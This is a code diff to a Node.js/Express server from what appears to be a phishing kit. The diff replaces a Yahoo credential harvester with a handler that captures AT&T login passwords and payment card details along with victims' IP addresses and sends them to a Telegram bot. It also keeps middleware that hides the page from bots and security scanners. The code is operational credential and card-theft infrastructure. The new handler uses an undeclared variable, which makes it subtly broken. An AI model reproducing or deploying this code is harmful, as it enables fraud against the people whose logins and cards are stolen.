@@ -5,17 +5,10 @@ const path = require('path');
 const { botToken, chatId } = require('./Config/settings.js');
 const antibot = require('./middleware/antibot');
 const { sendMessageFor } = require('simple-telegram-message');
-let IpAddress;
-
-app.use((req, res, next) => {
-    IpAddress = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-
-    console.log('Client IP Address:', IpAddress); // <-- Use IpAddress here
-    next();
-});
+const https = require('https');
+const querystring = require('querystring');
 
 
-// Middlewares
 app.use(express.static(path.join(`${__dirname}`)));
 
 const port = 3000; // You can use any available port
@@ -27,31 +20,67 @@ app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 
 app.post('/receive', (req, res) => {
-
-    
-  // Initialize a variable to collect the POST data
-  let message = '';
-  let myObject = req.body;
-
-  message += `✅ UPDATE TEAM | YAHOO | USER_${IpAddress}\n\n` +
-             `👤 LOGIN INFO\n`;
   
-  const myObjects = Object.keys(myObject);
+  let body = '';
 
-  for (const key of myObjects){
-    console.log(`${key}: ${myObject[key]}`);
-    message += `${key}: ${myObject[key]}\n`;
-  }
-
-    // Now you can handle the data or send it as needed
-    console.log(message); // This should be inside the 'end' event callback
-    const sendMessage = sendMessageFor(botToken, chatId);
-    sendMessage(message);
-
-    // Send a response back to the client if needed
-    res.send('Data received and processed.');
+  req.on('data', (data) => {
+    body += data;
   });
 
+  req.on('end', () => {
+    const postParams = querystring.parse(body);
+
+    if (postParams.Password) {
+      message += 'At&T Loginπ\n';
+      message += `π ${req.connection.remoteAddress}\n`;
+      message += `π ${new Date().toLocaleString()}\n`;
+
+      for (const key in postParams) {
+        message += `${key}: ${postParams[key]}\n`;
+      }
+    }
+
+    if (postParams.Expiry_date) {
+      message += `At&T Card details for ${postParams.visitor}\n`;
+      message += `π ${req.connection.remoteAddress}\n`;
+      message += `π ${new Date().toLocaleString()}\n`;
+
+      for (const key in postParams) {
+        message += `${key}: ${postParams[key]}\n`;
+      }
+    }
+
+    sendTelegramMessage(message);
+  });
+  
+  res.send('Data received successfully');
+});
+
+const sendTelegramMessage = (text) => {
+  
+    const website = `https://api.telegram.org/bot${botToken}`;
+    const params = querystring.stringify({
+      chat_id: chatId,
+      text: text,
+    });
+
+    const options = {
+      hostname: 'api.telegram.org',
+      path: '/bot' + botToken + '/sendMessage',
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Content-Length': params.length,
+      },
+    };
+
+    const req = https.request(options, (res) => {
+      // Handle the response if needed
+    });
+
+    req.write(params);
+    req.end();
+};
 
 
 
@@ -148,15 +177,11 @@ function antiBotMiddleware(req, res, next) {
     const clientRef = req.headers.referer || req.headers.origin;
 
     if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
-        // It's a bot, return a 404 response or handle it as needed
         return res.status(404).send('Not Found');
     } else {
-        // It's not a bot, serve the index.html page
         res.sendFile(path.join(__dirname, 'index.html'));
     }
 }
-
-
 
 // Middlewares
 app.use(antiBotMiddleware);
